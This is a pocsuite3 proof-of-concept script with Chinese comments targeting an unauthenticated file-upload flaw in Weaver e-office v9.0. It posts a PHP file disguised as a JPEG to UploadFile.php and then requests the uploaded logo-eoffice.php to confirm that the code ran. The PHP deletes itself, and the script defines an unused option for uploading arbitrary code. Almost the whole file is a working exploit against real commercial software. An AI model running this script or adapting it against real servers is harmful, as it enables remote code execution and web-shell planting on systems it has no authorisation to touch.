from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['luckying']  #  PoC作者的大名
    vulDate = '2021-11-27'  #漏洞公开的时间,不知道就写今天
    createDate = '2021-11-27'  # 编写 PoC 的日期
    updateDate = '2021-11-27'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/uAhcQ8O1HKHZ6JLZ_pmNzg']  # 漏洞地址来源,0day不用写
    name = '泛微e-office存在文件上传漏洞'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '泛微 e-office'  # 漏洞应用名称
    appVersion = '''v9.0'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    验证时会上传php 访问一次后自动删除，不对系统照成影响
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["code"] = OptString(default='',description='输入需要上传的代码',require=False)
        return o

    def _verify(self):
        result = {}
        path = "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
        headers={'Content-Type': 'multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4'}
        url = self.url + path
        data='''
--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="cmd.php"
Content-Type: image/jpeg

<?php echo md5(233);unlink(__FILE__);?>

--e64bdf16c554bbc109cecef6451c26a4--'''
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            resq_results=requests.get(url=self.url+'/images/logo/logo-eoffice.php')
            if "e165421110ba03099a1c0393373c5b43" in resq_results.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['path'] = self.url+'/images/logo/logo-eoffice.php'
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
            return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)